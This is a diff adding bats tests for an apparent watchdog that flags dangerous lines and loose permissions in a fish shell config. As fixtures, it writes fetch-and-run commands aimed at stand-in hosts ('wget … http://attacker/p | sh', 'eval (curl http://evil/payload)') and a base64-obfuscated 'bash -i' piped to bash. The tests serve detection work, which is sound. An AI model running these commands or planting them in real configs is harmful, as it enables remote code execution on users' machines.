@@ -150,3 +150,60 @@ cap() { cat "${SELFDEF_TEST_LOGCAP}"; }
     cap | grep -q '"event":"module_lib_missing"'
     cap | grep -q '"severity":"alert"'
 }
+
+@test "baseline is chmod 0600 (confidentiality — fish config inventory enumerates per-login source surface)" {
+    printf 'set -gx EDITOR vi\n' > "${CONF}"
+    run_wd
+    [ "$(stat -c '%a' "${BASELINE}")" = "600" ]
+}
+
+@test "INVARIANT (wget-pipe-sh in config): wget bootstrap → alert" {
+    printf 'wget -qO- http://attacker/p | sh\n' > "${CONF}"
+    run_wd
+    cap | grep -q '"severity":"alert"'
+}
+
+@test "INVARIANT (base64-decode-pipe in config): obfuscation → alert" {
+    printf 'echo YmFzaCAtaQ== | base64 -d | bash\n' > "${CONF}"
+    run_wd
+    cap | grep -q '"severity":"alert"'
+}
+
+@test "INVARIANT (preserved fish-eval extra — nested parens): eval (sub-cmd (subsub))" {
+    # Locks that the preserved extra handles nested-parens forms of
+    # fish's command substitution.
+    printf 'eval (curl (echo http://evil)/payload)\n' > "${CONF}"
+    run_wd
+    cap | grep -q '"severity":"alert"'
+}
+
+@test "INVARIANT (eval (...) with whitespace variants): eval  ( cmd )" {
+    printf 'eval ( curl http://evil/payload )\n' > "${CONF}"
+    run_wd
+    cap | grep -q '"severity":"alert"'
+}
+
+@test "INVARIANT (world-writable config → alert)" {
+    printf 'set -gx EDITOR vi\n' > "${CONF}"
+    run_wd
+    chmod 0666 "${CONF}"
+    : > "${SELFDEF_TEST_LOGCAP}"
+    run_wd
+    cap | grep -q '"severity":"alert"'
+}
+
+@test "INVARIANT (group-writable config): group-writable → alert above world-writable bar" {
+    printf 'set -gx EDITOR vi\n' > "${CONF}"
+    run_wd
+    chmod 0664 "${CONF}"
+    : > "${SELFDEF_TEST_LOGCAP}"
+    run_wd
+    cap | grep -qE '"severity":"(alert|warn)"'
+}
+
+@test "JSON record is emitted as a SINGLE main logger line (downstream JSON-line consumer contract)" {
+    printf 'set -gx EDITOR vi\n' > "${CONF}"
+    run_wd
+    main_count=$(cap | grep -cE '^-t selfdef-fish-config -- ')
+    [ "${main_count}" = "1" ]
+}
